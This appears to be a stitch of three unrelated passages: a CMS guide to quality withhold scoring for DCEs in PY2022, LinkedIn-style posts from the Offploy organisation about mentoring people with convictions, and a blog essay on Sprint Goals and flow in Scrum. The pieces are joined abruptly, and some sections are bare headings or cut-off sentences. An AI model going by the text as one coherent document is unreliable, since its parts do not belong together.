for PY2022 Q1). The provisional benchmarks will be updated in each subsequent quarterly report with data from the same period being used to calculate DCE\u2019s performance. Because the DCE performance and benchmarks will be based on the same time-period and have the same exact risk adjustment coefficients, DCEs will have a more accurate picture from quarter to quarter of their performance relative to the benchmark. A DCE\u2019s Final Earn-Back Rate for PY2022 will be based on quality benchmarks calculated using data from calendar year 2022 and will be determined during final reconciliation, which will occur in 2023. As with the hybrid approach for PY2021, the use of concurrent benchmarks for PY2022 will avoid potential coronavirus disease 2019 impacts.\n\n1.1.2 Step 2. Component Quality Scores Are Calculated: P4R Quality Measures Are Assessed, and P4P Quality Measures Are Compared against Their Quality Benchmarks to Determine Performance Levels\nP4R Component: For PY2022, 4% of the 5% Quality Withhold is associated with P4R. The claims-based measures of ACR, UAMCC, and DAH (for High Needs Population DCEs only) comprise 2% of the Quality Withhold, and the CAHPS Measure comprises 2%. There are therefore two Component Quality Scores associated with P4R, one for the claims-based measures, and one for CAHPS.\n\u2022 All DCEs will meet the requirement for the claims-based measures and automatically earn a Component Quality Score of 100% for the portion of the withhold tied to the P4R claims-based measures in Table 2-3.\n\u2022 All DCEs that authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 100%. DCEs that do not authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 0%. DCEs that are exempt from CAHPS will have a single P4R Component Quality Score of 100%.\nP4P Component: The PY2022 P4P component will be the same as PY2021, which combines the ACR and UAMCC measures. The highest performance level (i.e., percentile) achieved for either Quality Measure determines the P4P Component Quality Score. Furthermore, the P4P component is considered pass/fail\u2014all DCEs with at least one measure at or exceeding the 30th percentile will pass and receive a 100% Component Quality Score.\n\nAs in PY2021, in PY2022, a sliding scale approach will be applied to DCEs that do not meet the 30th percentile threshold on at least one of the two measures. The sliding scale allows DCEs to earn back at\n \n\nleast a portion of the 1% withhold, based on their highest measure performance. The details of the sliding scales are presented in Table 2-7. In the example in Step 1 above, where a DCE achieved the 20th percentile for ACR and the 10th percentile for UAMCC, the DCE would receive a P4P Component Quality Score of 80%.\n\nTable 2-7. Sliding Scale Earn-Back for P4P Component Quality Score, PY2021 and PY2022\n\nPercentile Met P4P Component Quality Score\n\u2265 30th 100%\n25th to < 30th 95%\n20th to < 25th 80%\n15th to < 20th 60%\n10th to < 15th 40%\n5th to < 10th 20%\n< 5th 0%\n1.1.3 Step 3. Component Quality Scores Are Weighted to Calculate the Total Quality Score\nAfter assessing P4R measures and determining performance levels for each P4P measure, CMS calculates Component Quality Scores for each DCE. The component weight is the proportion of the overall Quality Withhold tied to that component. In PY2022, there are three Component Quality Scores. The first component is P4P, based on ACR and UAMCC. The P4P component has a weight of 1/5, contributing 1% out of the 5% Quality Withhold. The second component is P4R for claims-based measures and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. The third component is P4R for CAHPS and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. Note that additional P4P components (such as DAH) will be added in subsequent years.\n\nThe Total Quality Score is the percentage of the Quality Withhold eligible for earn-back that a DCE will actually earn back based on its quality performance and reporting. The Total Quality Score is calculated as the sum of the products of the Component Quality Scores and component weights, as shown in the equation below.\n\nTotal Quality Score = \u2211 (Component Quality Scores \\* Component Weights)\n\nIn our example above, the DCE receives a P4P Component Quality Score of 80% based on the sliding scale. The same DCE receives a P4R Component Quality Score for claims-based measures of 100%. This DCE also authorized a CAHPS Survey vendor, earning 100% of the P4R Component Quality Score for CAHPS. The P4P component has a weight of 1/5 and the P4R components each have a weight of 2/5. The Total Quality Score for this DCE is (80% \\* 1/5) + (100% \\* 2/5) + (100% \\* 2/5) = 96%.\n\n1.1.4 Step 4. Total Quality Score Is Multiplied by the Eligible Earn-Back Rate to Determine a DCE\u2019s\nFinal Earn-Back Rate\nIn PY2022, the Eligible Earn-Back Rate will be 5% for all DCEs. A DCE with a Total Quality Score of 96% will have a Final Earn-Back Rate of 4.8%. A DCE\u2019s Final Earn-Back Rate will be determined during final reconciliation, which will occur in 2023 for PY2022. The steps for the example described in this section, starting with Section 2.5, are summarized in Table 3-1."]

Organisations like ours and St Giles have been doing it for yonks.\n\nIt's especially exciting when we see esteemed organisations like The CIPD Trust making giant steps in this space and teaming up with us and St Giles to launch a pilot, supported by the HR and people development profession.\n\nThe pilot has been developed to help people with lived experience of the criminal justice system re-enter the workplace and sustain current roles. Over six months, about 20 mentors and mentees will be matched together and work together to rebuild things such as confidence, skills and help those who have been out of the workplace for some time become comfortable and settled again.\n\nLink in the comments to read more on this.\n\nexample 4: Exciting news - Offploy is partnering with Jobs 22 to provide peer-led employability support to participants of the Restart Scheme with criminal convictions, across East Central England.\n\nOur tailored support, led by mentors with lived experience of the criminal justice system, will help participants overcome the familiar obstacles often experienced by people with criminal convictions attempting to secure employment.\n\nWe're super proud to complement Jobs 22's delivery of the scheme and are excited to help our peers navigate the employment landscape with confidence.\n\nHumongous thanks to Sarah Williams AIEP who has held our hand and helped us to establish the relationship. Link in the comments to a bit more info and a quote from Ayden Sims FIEP and myself.\n\nexample 5: It's the time of year for reflection, to take a step back and work out what has actually gone on. For us at Offploy.org, it's a year where we've had the confidence to lose our own self-imposed label and cast our net wider.\n\nIf we can't shed a label as an organisation, how can we expect the people we support to be able to do the same? We will always celebrate our lived experience of the criminal justice system. Because this gives us our authenticity, our understanding of our peers, our chance for redemption (in our own eyes and society's).\n\nBut we're much more than this. Offending so very often comes at the very end of a well-trodden path, familiar to so many of us working in this space. Remove the \"ex-offender\" label and replace it with a whole host of others.\n\nThis year, we've had the confidence to look further afield. Interrogating our data set has allowed us to look at the amazingly impactful support we have given to our candidates, meeting a multitude of needs.\n\nIn turn, we've decided to not only support people who have reached the end of the line and come into contact with the criminal justice system.\n\nIn practice this means we've delivered services that have focussed on Homelessness, Money Management and Common Mental Health challenges.\n\nWe are so grateful for the support shown in us by our commissioners, who have encouraged us to look at other opportunities to deliver our work. And most importantly, our delivery team led expertly by Joe Prest who have gleefully accepted the challenge.\n\nRoll on 2023."]

That's not feasible, it's not smart, it's not Scrum. And it won't lead to good flow.\n\nThere are a few possible answers to the question in the title:\n\nYes\n\nNo\n\nYes, but that's impossible in our unique context, so we disregard that\n\nYou don't need to have a Sprint Goal, so this is a trick question\n\nLet us consult the Scrum Guide:\n\nThe Scrum Team is responsible for all product-related activities from stakeholder collaboration, verification, maintenance, operation, experimentation, research and development, and anything else that might be required. They are structured and empowered by the organization to manage their own work.\nThe Scrum Guide (2020): Scrum Team. (There doesn't seem to be a section on \"DevOps Teams\".)\n\nA single Scrum Team might have work required in all of these areas.\n\nOf course, one could theoretically craft Sprint Goals that would encompass all the stupid crap your Product Owner wants, plus all that other work that nobody talks about but everyone knows needs to get done, and by that win two million extra Scrum points each and every Sprint. But Scrum is not a gamification framework, it's a framework for delivering value.\n\nWhat is the purpose of having a Sprint Goal?\n\nWhat is the purpose of having a goal at all?\n\nWhy have a goal, and not just a plan? A todo-list?\n\nDon't:\n\nEndlessly argue why something supports the Sprint Goal when it is unclear AT BEST whether and how it does\n\nMake stupid Sprint Goals just so that everything fits\n\nHave ten Sprint Goals\n\nNot only will you be wasting your time, you will probably mislead your stakeholders as well.\n\nLet's discuss it from this perspective: what makes sense?\n\nThe whole reason for the existence of your Scrum Team is to deliver value for your customers/stakeholders.\nFlow Metrics for Scrum Teams, page 2. (Not sure who wrote that, but it sure sounds like something Daniel might say.)\n\nIn other words, there might be a lot more work to be done other than \"making new stuff\". It's not about doing Scrum perfectly.\n\nAnd, having everything relating to the Sprint Goal wouldn't be perfect Scrum anyway. If you need a direct quote to be convinced, I am happy to provide several. Let's start with the fact that work related to improving effectiveness can be added to the Sprint Backlog:\n\nThe Scrum Team identifies the most helpful changes to improve its effectiveness. The most impactful improvements are addressed as soon as possible. They may even be added to the Sprint Backlog for the next Sprint.\n\nOf course, if you're using flow metrics, you will make some adjustments to your workflow right on the spot, and don't add anything to the Sprint Backlog for it. The action has already been taken!\n\nIn other instances, the improvement itself might be to actually fix that one damned thing that keeps acting up each and every Sprint, endangering all Sprint goals (or at least making people lose sleep). Showing the actual consequences of not fixing that one thing is easier with flow metrics.\n\nThe Scrum Team commits to achieving its goals and to supporting each other. Their primary focus is on the work of the Sprint to make the best possible progress toward these goals.\nThat's right! Another quote from the \"SG\"!\n\nThis is better than having an overly broad Sprint Goal, since an overly broad Sprint Goal doesn't create much focus either.\n\nInstead, you'll be better off making your decisions based on what will lead to the better flow.\n\nImagine that it's really about time to upgrade the database (are people still using those?). It's never a good time. It's never a suitable time. It won't be a pleasurable time. Nobody will have a good time. Yet, every Sprint for the last six Sprints, you have been working around the fact that it has not been upgraded. You have avoided making certain changes, since those changes might complicate matters further when the database upgrade inevitably, one day, has to happen. Last summer, everybody was gone except the two people who would be capable of doing it, and it still didn't happen. Sorry, but \"get the database upgraded\" is unlikely to ever be a Sprint Goal.\n\nThis does not sound like controlling risk. Yet:\n\nScrum employs an iterative, incremental approach to optimize predictability and to control risk.\n\nYou don't want to stop controlling risk just because it doesn't fit the Sprint Goal.\n\nAlso, Product Backlog refinement will consume some time. You should extend your flow metrics to that, of course, but the refinement itself is rarely added to the Sprint Backlog.\n\nIn other words: the Developers do not spend 100% of their time toward reaching the Sprint Goal. That's not feasible, it's not smart, it's not Scrum. And it won't lead to good flow.\n\nWhat the Product Owner decides to spend the Sprint on is ultimately an economic decision. A serious one.\n\nDuring the Sprint:\n\nNo changes are made that would endanger the Sprint Goal;\n\nQuality does not decrease;\n\nThe Product Backlog is refined as needed; and,\n\nScope may be clarified and renegotiated with the Product Owner as more is learned.\n\nScrum Guide 2020: The Sprint\n\nThe planning part then becomes: how can we do this without endangering the Sprint Goal? That can get complicated quickly. The thing is, almost anything could endanger the Sprint Goal. An overfilled Sprint Backlog will undermine collaboration.\n\nFlow, value and transparency. You need flow to create value. You need transparency to make informed decisions.\n\nNow, with that Scrum lawyering out of the way, let's talk about what makes sense.\n\nYou want to deliver value.\n\nYou want flow.\n\nGoals help focus.\n\nFocus helps flow.\n\nScrum people are obsessed with transparency. They can't get enough of it. And neither should you.\n\nCharacteristics of a good Sprint Goal\n\nMuch has been written on this topic. From a have-a-good-flow-and-stop-wasting-time perspective, here are the most important ones:\n\nIt is a singular, clear objective.\n\nIt makes sense given the PBIs selected for the Sprint.\n\nIt could in theory be achieved by an entirely different set of PBIs.\n\nIt is measurable. That is to say, it is possible to determine, without discussion or speculation, whether or not progress toward it has been made (and, of course, whether it has been reached).\n\nIt maps nicely to the Product Goal.\n\nIn conjunction, there has to be room for reevaluating the plan. If not, people will just work as hard as they can on as many things as possible, achieve nothing, and having to explain \"why\" they couldn't achieve the thing they didn't understand the \"why\" of in the first place.\n\nThe biggest waste of time during Sprint Planning\n\n... is pressuring Developers to add more to the Sprint Backlog.\n\nWith flow metrics, every change to the Sprint Backlog immediately gets reflected in the certainty of the forecast. More pressure? More work? Less certainty.\n\nYou can say \"yes, and\" and say the chance. Or we can replace it with something else.\n\nDisappointing, but more honest, and less heroic.\n\nSaying \"no\" is a tough job, and you want to make it easier. You're also making it easier for the Product Owner to say no as well.\n\nSome things are just irrelevant\n\nYour todo-list in daily life might not always map to the vision. Feed your cat, or it dies. Not very glamorous, is it? But it's something you're going to do, and it will require some of your time.\n\nConsider alternative ways of reaching the Sprint Goal\n\nWhat is in a Sprint Backlog?\n\nFlow in Sprint Planning\n\nForecasting\n\nThe Scrum Guide says:\n\nVarious practices exist to forecast progress [...]. While proven useful, these do not replace the importance of empiricism.\n\nIn other words: if we know that what we are looking at does not tell the full story, abandon it! You can't automate empiricism. Keep your eyes open!\n\nBe critical of the tools, understand its assumptions, abandon the use of them whenever they stop being actionable, that is, influencing your plan.\n\nIt also means that you never take anything for certain. You don't know that those items will be finished until they actually are.\n\nA forecast without a confidence level is essentially worthless.\n\nReflect on the usefulness for:\n\nDevelopers\n\nScrum Team\n\nStakeholder communication\n\n\"We said 50% confidence was acceptable, yet everybody forgot about that when we couldn't do it.\"\n\nIn other words, a Sprint Backlog might contain:\n\nThe Sprint Goal\n\nThe plan for reaching the Sprint Goal\n\nThe PBIs selected for the Sprint\n\nChanges planned that will increase quality\n\nChanges planned that will increase effectiveness\n\nIt is not always clear when a plan should be abandoned\n\nHaving a plan that could \n\nThere is no award for having executed the original plan\n\nRemove PBIs ahead of time\n\nPeople never cancel work. Embrace that fact\n\nInstead of lecturing about the sunk cost fallacy every Sprint, do things to reduce the chances. Smaller items means smaller investments. Less sunk cost if we abandon it.\n\nThink smaller, learn bigger\n\nShorter Sprints can be employed to generate more learning cycles and limit risk of cost and effort to a smaller time frame.\nScrum Guide 2020: The Sprint\n\nConsider this:\n\nSmaller PBIs can be employed to generate more learning cycles and limit risk of cost and effort to a smaller time frame.\n\nSee if you can write similar sentences with other elements from the Kanban Guide.\n\nSprint Planning is iterative\n\nThe three topics are not necessarily handled in sequence, one-and-done, but iteratively.\n\nNever be afraid to make a plan that makes sense\n\nIf, based on what you know now, you would have made an entirely different plan during Sprint Planning, then stop following the current one! With shorter Sprints, this might even be more of a bias.\n\nThis does not only mean creativity about how one will get PBIs finished, but the overall plan for reaching the Sprint Goal!\n\nA Scrum Team is expected to adapt the moment it learns anything new through inspection.\nThe Scrum Guide (2020): Adaptation"]
